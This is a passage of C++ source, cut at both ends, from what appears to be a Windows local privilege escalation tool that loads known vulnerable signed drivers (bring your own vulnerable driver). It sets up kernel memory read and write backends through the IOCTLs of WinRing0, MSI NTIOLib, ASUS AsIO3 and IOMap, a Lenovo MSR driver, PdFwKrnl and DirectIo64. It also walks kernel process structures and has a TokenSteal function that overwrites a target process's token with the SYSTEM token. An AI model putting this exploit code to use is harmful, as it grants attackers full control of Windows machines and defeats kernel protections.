        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysRead((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool Ktapi_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T rem = (SIZE_T)(0x1000 - (pCurVA & 0xFFF));
        SIZE_T chunk = std::min(size, rem);
        QWORD pa = Ktapi_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!Ktapi_PhysWrite((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - PdFwKrnl backend
// ---------------------------------------------------------------------------
static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;
#define IOCTL_AMDPDFW_MEMCPY 0x80002014

typedef struct { BYTE r[16]; PVOID Dst; PVOID Src; PVOID r2; DWORD Size; DWORD r3; } PDFW_REQ;

static bool PdfwKrnl_KRead(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = buf; r.Src = (PVOID)addr; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

static bool PdfwKrnl_KWrite(QWORD addr, PVOID buf, DWORD size) {
    PDFW_REQ r{}; r.Dst = (PVOID)addr; r.Src = buf; r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_pdfwDev, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, nullptr);
}

// ---------------------------------------------------------------------------
// Kernel R/W - WinRing0 backend
// Device: \\.\WinRing0_1_2_0
// Format: [QWORD physAddr][DWORD size][BYTE data...] in one METHOD_BUFFERED buf.
// Driver reads header (12 bytes) then fills Data[] in the same buffer.
// ---------------------------------------------------------------------------
static HANDLE g_wr0Dev = INVALID_HANDLE_VALUE;
#define WR0_IOCTL_READ_MEM  0x9C402584u
#define WR0_IOCTL_WRITE_MEM 0x9C402588u

static bool WinRing0_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    DWORD returned = 0;
    static bool dbg_wr0 = false;
    if (!DeviceIoControl(g_wr0Dev, WR0_IOCTL_READ_MEM,
            buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
        if (!dbg_wr0) {
            printf("[dbg] WinRing0_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                WR0_IOCTL_READ_MEM, GetLastError(), pa, size);
            dbg_wr0 = true;
        }
        return false;
    }
    if (returned < (DWORD)size) return false;
    memcpy(out, buf.data() + 12, size);
    return true;
}

static bool WinRing0_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    memcpy(buf.data() + 12, data, size);
    DWORD returned = 0;
    return DeviceIoControl(g_wr0Dev, WR0_IOCTL_WRITE_MEM,
            buf.data(), (DWORD)bufLen, nullptr, 0, &returned, nullptr) != 0;
}

// Generic Va2Pa for phys-only backends: delegates to BiosTool IOCTL 0x222034.
// g_biostoolDev must be open (primary or side-loaded via --va2pa).
static PVOID ExtPhys_Va2Pa(PVOID va) {
    return BiosTool_Va2Pa(va);
}

static bool WinRing0_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!WinRing0_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool WinRing0_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!WinRing0_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - NTIOLib (MSI MysticLight) backend
// Device: \\.\NTIOLib_MysticLight
// DevType: 0xC350 (confirmed from binary scan)
// Format (OLS-compat): input=[QWORD physAddr][DWORD size][BYTE data...]
// Phys mem IOCTL: 0xC35060D4 (fn=0x835, OLS_READ_MEMORY_QWORD-equivalent)
// ---------------------------------------------------------------------------
static HANDLE g_ntiodev = INVALID_HANDLE_VALUE;
#define NTIO_IOCTL_READ_MEM  0xC35060D4u
#define NTIO_IOCTL_WRITE_MEM 0xC35060E4u

static bool NTIOLib_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    DWORD returned = 0;
    static bool dbg_ntio = false;
    if (!DeviceIoControl(g_ntiodev, NTIO_IOCTL_READ_MEM,
            buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
        if (!dbg_ntio) {
            printf("[dbg] NTIOLib_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                NTIO_IOCTL_READ_MEM, GetLastError(), pa, size);
            dbg_ntio = true;
        }
        return false;
    }
    if (returned < (DWORD)size) {
        static bool dbg_ntio2 = false;
        if (!dbg_ntio2) {
            printf("[dbg] NTIOLib_ReadPhys returned %lu < needed %zu\n", returned, size);
            dbg_ntio2 = true;
        }
        return false;
    }
    memcpy(out, buf.data() + 12, size);
    return true;
}

static bool NTIOLib_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    memcpy(buf.data() + 12, data, size);
    DWORD returned = 0;
    return DeviceIoControl(g_ntiodev, NTIO_IOCTL_WRITE_MEM,
            buf.data(), (DWORD)bufLen, nullptr, 0, &returned, nullptr) != 0;
}

static bool NTIOLib_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!NTIOLib_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool NTIOLib_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!NTIOLib_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - AsIO3 (ASUS System IO3) backend
// Device: \\.\Asusgio3
// IOCTLs: 0xA040200C (read), 0xA0402010 (write)  dev=0xA040 confirmed via binary
// Input:  [QWORD physAddr][DWORD size] (12 bytes), METHOD_BUFFERED
// Output: raw data bytes
// ---------------------------------------------------------------------------
static HANDLE g_asio3dev = INVALID_HANDLE_VALUE;
#define ASIO3_IOCTL_READ_MEM  0xA040200Cu
#define ASIO3_IOCTL_WRITE_MEM 0xA0402010u

static bool AsIO3_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    DWORD returned = 0;
    // Driver binary cmp at 0x29xx: jb error if inSz < 0x1028; special path for inSz==0x1020
    static const DWORD kTrySizes[] = { 0x1020, 0x1028, 0x2000, 0 };
    for (int i = 0; kTrySizes[i]; i++) {
        DWORD inSz = kTrySizes[i];
        std::vector<BYTE> inBuf(inSz, 0);
        *(QWORD*)inBuf.data() = (QWORD)(ULONG_PTR)pa;
        *(DWORD*)(inBuf.data() + 8) = (DWORD)size;
        DWORD outSz = (DWORD)(size + 0x20);   // slightly larger output
        std::vector<BYTE> outBuf(outSz, 0);
        if (DeviceIoControl(g_asio3dev, ASIO3_IOCTL_READ_MEM,
                inBuf.data(), inSz, outBuf.data(), outSz, &returned, nullptr)) {
            printf("[dbg] AsIO3 succeeded with inSz=%lu returned=%lu\n", inSz, returned);
            memcpy(out, outBuf.data(), std::min((DWORD)size, returned));
            return returned > 0;
        }
        DWORD err = GetLastError();
        printf("[dbg] AsIO3_ReadPhys inSz=%lu err=%lu pa=%p sz=%zu\n", inSz, err, pa, size);
    }
    return false;
}

static bool AsIO3_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    memcpy(buf.data() + 12, data, size);
    DWORD returned = 0;
    return DeviceIoControl(g_asio3dev, ASIO3_IOCTL_WRITE_MEM,
            buf.data(), (DWORD)bufLen, buf.data(), (DWORD)bufLen, &returned, nullptr) != 0;
}

static bool AsIO3_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!AsIO3_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool AsIO3_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!AsIO3_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - LnvMSRIO (Lenovo, CVE-2025-8061) backend
// Device: \\.\WinMsrDev
// Format: [QWORD physAddr][DWORD size][BYTE data...] METHOD_BUFFERED
// IOCTLs: 0x890020D4 (guess: dtype=0x8900 fn=0x835) - empirical
// ---------------------------------------------------------------------------
static HANDLE g_lnvdev = INVALID_HANDLE_VALUE;
#define LNV_IOCTL_READ_MEM  0x890020D4u
#define LNV_IOCTL_WRITE_MEM 0x890020E4u

static bool LnvMSRIO_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    DWORD returned = 0;
    static bool dbg_lnv = false;
    if (!DeviceIoControl(g_lnvdev, LNV_IOCTL_READ_MEM,
            buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
        if (!dbg_lnv) {
            printf("[dbg] LnvMSRIO_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                LNV_IOCTL_READ_MEM, GetLastError(), pa, size);
            dbg_lnv = true;
        }
        return false;
    }
    if (returned < (DWORD)size) {
        static bool dbg_lnv2 = false;
        if (!dbg_lnv2) {
            printf("[dbg] LnvMSRIO_ReadPhys returned %lu < needed %zu\n", returned, size);
            dbg_lnv2 = true;
        }
        return false;
    }
    memcpy(out, buf.data() + 12, size);
    return true;
}

static bool LnvMSRIO_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    memcpy(buf.data() + 12, data, size);
    DWORD returned = 0;
    return DeviceIoControl(g_lnvdev, LNV_IOCTL_WRITE_MEM,
            buf.data(), (DWORD)bufLen, nullptr, 0, &returned, nullptr) != 0;
}

static bool LnvMSRIO_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!LnvMSRIO_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool LnvMSRIO_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!LnvMSRIO_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - IOMap (ASUS IOMap) backend
// Device: \\.\IOMap
// DevType: 0x8300 (confirmed from binary scan)
// IOCTLs: 0x830020D4 (fn=0x835 OLS_READ_MEMORY_QWORD), 0x830020DC (write)
// Format: [QWORD physAddr][DWORD size][BYTE data...]
// ---------------------------------------------------------------------------
static HANDLE g_iomapdev = INVALID_HANDLE_VALUE;
#define IOMAP_IOCTL_READ_MEM  0x830020D4u
#define IOMAP_IOCTL_WRITE_MEM 0x830020DCu

static bool IOMap_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    DWORD returned = 0;
    static bool dbg_iomap = false;
    if (!DeviceIoControl(g_iomapdev, IOMAP_IOCTL_READ_MEM,
            buf.data(), 12, buf.data(), (DWORD)bufLen, &returned, nullptr)) {
        if (!dbg_iomap) {
            printf("[dbg] IOMap_ReadPhys IOCTL 0x%08X failed: err=%lu pa=%p sz=%zu\n",
                IOMAP_IOCTL_READ_MEM, GetLastError(), pa, size);
            dbg_iomap = true;
        }
        return false;
    }
    if (returned < (DWORD)size) {
        static bool dbg_iomap2 = false;
        if (!dbg_iomap2) {
            printf("[dbg] IOMap_ReadPhys returned %lu < needed %zu\n", returned, size);
            dbg_iomap2 = true;
        }
        return false;
    }
    memcpy(out, buf.data() + 12, size);
    return true;
}

static bool IOMap_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    SIZE_T bufLen = 8 + 4 + size;
    std::vector<BYTE> buf(bufLen, 0);
    *(QWORD*)buf.data() = (QWORD)(ULONG_PTR)pa;
    *(DWORD*)(buf.data() + 8) = (DWORD)size;
    memcpy(buf.data() + 12, data, size);
    DWORD returned = 0;
    return DeviceIoControl(g_iomapdev, IOMAP_IOCTL_WRITE_MEM,
            buf.data(), (DWORD)bufLen, nullptr, 0, &returned, nullptr) != 0;
}

static bool IOMap_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!IOMap_ReadPhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool IOMap_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = (PUCHAR)(ULONG_PTR)va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        ULONG chunk = (ULONG)std::min(size, (SIZE_T)0x1000);
        PVOID pa = ExtPhys_Va2Pa(pCurVA);
        if (!pa) return false;
        if (!IOMap_WritePhys(pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Kernel R/W - DirectIo64 backend
// Device: \\.<service> or \\.\DirectIo64
// IOCTLs: 0x8011E044 (map physical page), 0x8011E0A0 (bit-clear low nibble)
// Request: +0x18 size, +0x1c phys, +0x24 output base, +0x2c flag
// ---------------------------------------------------------------------------
static HANDLE g_directioDev = INVALID_HANDLE_VALUE;
static bool   g_directioWrite = false;
static QWORD  g_directioGatePa = 0;
static std::wstring g_directioHelperSvc;
static std::wstring g_directioHelperReg;
static std::wstring g_directioHelperDrop;

static bool DirectIo_KRead(QWORD va, PVOID buf, SIZE_T size);
static bool DirectIo_KWrite(QWORD va, PVOID buf, SIZE_T size);

// ---------------------------------------------------------------------------
// Unified R/W dispatch
// ---------------------------------------------------------------------------
static ProviderType g_activeProvider;

static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KRead(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KRead(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KRead(addr, buf, (DWORD)size);
    case ProviderType::WinRing0: return WinRing0_KRead(addr, buf, size);
    case ProviderType::NTIOLib:  return NTIOLib_KRead(addr, buf, size);
    case ProviderType::AsIO3:    return AsIO3_KRead(addr, buf, size);
    case ProviderType::LnvMSRIO: return LnvMSRIO_KRead(addr, buf, size);
    case ProviderType::IOMap:    return IOMap_KRead(addr, buf, size);
    case ProviderType::DirectIo: return DirectIo_KRead(addr, buf, size);
    default: return false;
    }
}

static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KWrite(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KWrite(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
    case ProviderType::WinRing0: return WinRing0_KWrite(addr, buf, size);
    case ProviderType::NTIOLib:  return NTIOLib_KWrite(addr, buf, size);
    case ProviderType::AsIO3:    return AsIO3_KWrite(addr, buf, size);
    case ProviderType::LnvMSRIO: return LnvMSRIO_KWrite(addr, buf, size);
    case ProviderType::IOMap:    return IOMap_KWrite(addr, buf, size);
    case ProviderType::DirectIo: return DirectIo_KWrite(addr, buf, size);
    default: return false;
    }
}

static QWORD KReadQword(QWORD addr) {
    QWORD v = 0;
    KRead(addr, &v, 8);
    return v;
}

// ---------------------------------------------------------------------------
// Offset scanning
// ---------------------------------------------------------------------------
static bool LooksLikeName(QWORD eproc, QWORD off) {
    BYTE b[16]{};
    if (!KRead(eproc + off, b, 16)) return false;
    int ok = 0;
    for (int i = 0; i < 15; i++) {
        if (!b[i]) break;
        if (b[i] >= 0x20 && b[i] < 0x7f) ok++;
    }
    return ok >= 3;
}

static bool LooksLikeProtection(QWORD eproc, QWORD off) {
    BYTE b = 0xFF;
    if (!KRead(eproc + off, &b, 1)) return false;
    // Valid PS_PROTECTION: Type (bits 0-1) in {0,1,2}, bits 2-3 must be 0,
    // Signer (bits 4-7) in {0..7}. Covers all real values 0x00..0x72.
    return b <= 0x72 && (b & 0x0C) == 0 && (b & 0x03) <= 2;
}

static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
    (void)pid;
    if (!LooksLikeName(eproc, g_off.ImageFileName)) {
        for (QWORD s = 0x300; s <= 0x700; s += 8) {
            if (LooksLikeName(eproc, s)) {
                printf("[*] ImageFileName scanned to 0x%llX (was 0x%llX)\n", s, g_off.ImageFileName);
                g_off.ImageFileName = s;
                break;
            }
        }
    }
    if (!LooksLikeProtection(eproc, g_off.Protection)) {
        for (QWORD s = 0x500; s <= 0xA00; s += 8) {
            if (LooksLikeProtection(eproc, s)) {
                printf("[*] Protection scanned to 0x%llX (was 0x%llX)\n", s, g_off.Protection);
                g_off.Protection = s;
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Kernel base + System EPROCESS
// ---------------------------------------------------------------------------
static QWORD PsISPOffset() {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)p - (QWORD)ntos) : 0;
    FreeLibrary(ntos);
    return off;
}

struct KernelBase { QWORD ntosBase; QWORD systemEproc; };

static KernelBase GetKernelBase() {
    KernelBase r{};
    LPVOID drvs[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
        r.ntosBase = (QWORD)drvs[0];
    if (!r.ntosBase) return r;
    QWORD sysOff = PsISPOffset();
    if (!sysOff) return r;
    r.systemEproc = KReadQword(r.ntosBase + sysOff);
    return r;
}

// ---------------------------------------------------------------------------
// Process walker
// ---------------------------------------------------------------------------
static QWORD FindEprocessByPid(QWORD sysEproc, DWORD pid, char name[16]) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD cur = KReadQword(ep + g_off.UniqueProcessId);
        if ((DWORD)cur == pid) {
            if (name) { KRead(ep + g_off.ImageFileName, name, 15); name[15] = 0; }
            return ep;
        }
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep = flink - g_off.ActiveProcessLinks;
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15);
        if (_stricmp(nm, target) == 0) return ep;
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Token steal
// ---------------------------------------------------------------------------
static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL;
    if (!sysToken) { printf("[-] Failed to read SYSTEM token\n"); return false; }
    printf("[+] SYSTEM token: 0x%llX\n", sysToken);

    char nm[16]{};
    QWORD targetEp = FindEprocessByPid(sysEproc, targetPid, nm);
    if (!targetEp) { printf("[-] Target PID %lu not found\n", targetPid); return false; }
    printf("[+] Target EPROCESS 0x%llX (%s)\n", targetEp, nm);

    QWORD curToken = KReadQword(targetEp + g_off.Token);
    printf("[*] Current token: 0x%llX -> stealing SYSTEM token\n", curToken);

    QWORD newToken = sysToken | (curToken & 0xF);
    if (!KWrite(targetEp + g_off.Token, &newToken, 8)) {
        printf("[-] KWrite token failed\n"); return false;
    }
    QWORD check = KReadQword(targetEp + g_off.Token);
    printf("[!!!] Token written: 0x%llX (verify: 0x%llX)\n", newToken, check);
    return true;
}

// ---------------------------------------------------------------------------
// ntoskrnl export resolver
// ---------------------------------------------------------------------------
static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, numFuncs = 0;
    DWORD namesRVA = 0, funcsRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x14, &numFuncs,  4);
    KRead(eDir + 0x18, &numNames,  4);
    KRead(eDir + 0x1C, &funcsRVA,  4);
    KRead(eDir + 0x20, &namesRVA,  4);
    KRead(eDir + 0x24, &ordsRVA,   4);

    size_t targLen = strlen(symName);
    for (DWORD i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256]{};
        KRead(ntosBase + nameRVA, buf, (DWORD)std::min(targLen + 2, (size_t)255));
        if (memcmp(buf, symName, targLen) == 0 && buf[targLen] == 0) {
            WORD ord = 0;
            KRead(ntosBase + ordsRVA + (QWORD)i * 2, &ord, 2);
            DWORD funcRVA = 0;
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// DirectIo64 implementation
// ---------------------------------------------------------------------------
#define DIRECTIO_IOCTL_MAP      0x8011E044u
#define DIRECTIO_IOCTL_BITCLEAR 0x8011E0A0u

static const BYTE kDirectIoPrefix[30] = {
    0x48,0x8b,0xc4,0x48,0x89,0x48,0x08,0x53,0x56,0x57,
    0x48,0x81,0xec,0xa0,0x00,0x00,0x00,0x48,0x8b,0xd9,
    0x33,0xf6,0x48,0x89,0x70,0x20,0x40,0x38,0x71,0x2c
};

static QWORD DirectIo_GetNtosBase() {
    LPVOID drvs[64];
    DWORD cb;
    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb) && cb >= sizeof(LPVOID))
        return (QWORD)drvs[0];
    return 0;
}

static QWORD DirectIo_HelpVa2Pa(QWORD va) {
    if (g_ktapiDev != INVALID_HANDLE_VALUE) {
        QWORD pa = Ktapi_Va2Pa(va);
        if (pa) return pa;
    }
    if (g_biostoolDev != INVALID_HANDLE_VALUE)
        return (QWORD)(ULONG_PTR)BiosTool_Va2Pa((PVOID)va);
    return 0;
}

static QWORD DirectIo_MapPhysPage(QWORD page, bool write) {
    if (g_directioDev == INVALID_HANDLE_VALUE) return 0;
    if (write && !g_directioWrite) {
        static bool hint = false;
        if (!hint) { printf("[!] DirectIo write not enabled; use --directio-enable-write\n"); hint = true; }
        return 0;
    }
    BYTE req[0x40]{};
    *(DWORD*)(req + 0x18) = 0x1000;
    *(QWORD*)(req + 0x1c) = page;
    req[0x28] = 0;
    req[0x2c] = write ? 1 : 0;
    DWORD got = 0;
    if (!DeviceIoControl(g_directioDev, DIRECTIO_IOCTL_MAP,
            req, 0x3d, req, sizeof(req), &got, nullptr)) {
        static bool dbg = false;
        if (!dbg) {
            printf("[dbg] DirectIo_MapPhysPage flag=%d page=0x%llX err=%lu\n",
                write ? 1 : 0, page, GetLastError());
            dbg = true;
        }
        return 0;
    }
    if (*(DWORD*)(req + 0x00) != 0) {
        static bool dbg = false;
        if (!dbg) {
            printf("[dbg] DirectIo_MapPhysPage status=0x%08X page=0x%llX flag=%d\n",
                *(DWORD*)(req + 0x00), page, write ? 1 : 0);
            dbg = true;
        }
        return 0;
    }
    return *(QWORD*)(req + 0x24);
}

static bool DirectIo_ReadPhys(PVOID pa, SIZE_T size, PVOID out) {
    auto pCurPA  = (PUCHAR)(ULONG_PTR)pa;
    auto pCurBuf = (PUCHAR)out;
    while (size > 0) {
        QWORD  page  = ((QWORD)(ULONG_PTR)pCurPA) & ~0xFFFULL;
        SIZE_T off   = (SIZE_T)((QWORD)(ULONG_PTR)pCurPA & 0xFFF);
        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - off));
        QWORD  base  = DirectIo_MapPhysPage(page, false);
        if (!base) return false;
        memcpy(pCurBuf, (PUCHAR)base + off, chunk);
        pCurPA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool DirectIo_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
    auto pCurPA   = (PUCHAR)(ULONG_PTR)pa;
    auto pCurData = (PUCHAR)data;
    while (size > 0) {
        QWORD  page  = ((QWORD)(ULONG_PTR)pCurPA) & ~0xFFFULL;
        SIZE_T off   = (SIZE_T)((QWORD)(ULONG_PTR)pCurPA & 0xFFF);
        SIZE_T chunk = std::min(size, (SIZE_T)(0x1000 - off));
        QWORD  base  = DirectIo_MapPhysPage(page, true);
        if (!base) return false;
        memcpy((PUCHAR)base + off, pCurData, chunk);
        pCurPA   += chunk;
        pCurData += chunk;
        size     -= chunk;
    }
    return true;
}

static bool DirectIo_BitClear(QWORD pa, int bit) {
    if (g_directioDev == INVALID_HANDLE_VALUE) return false;
    if (bit < 0 || bit > 3) return false;
    BYTE in[9]{};
    *(QWORD*)in = pa;
    in[8] = (BYTE)bit;
    BYTE out[16]{};
    DWORD got = 0;
    return DeviceIoControl(g_directioDev, DIRECTIO_IOCTL_BITCLEAR,
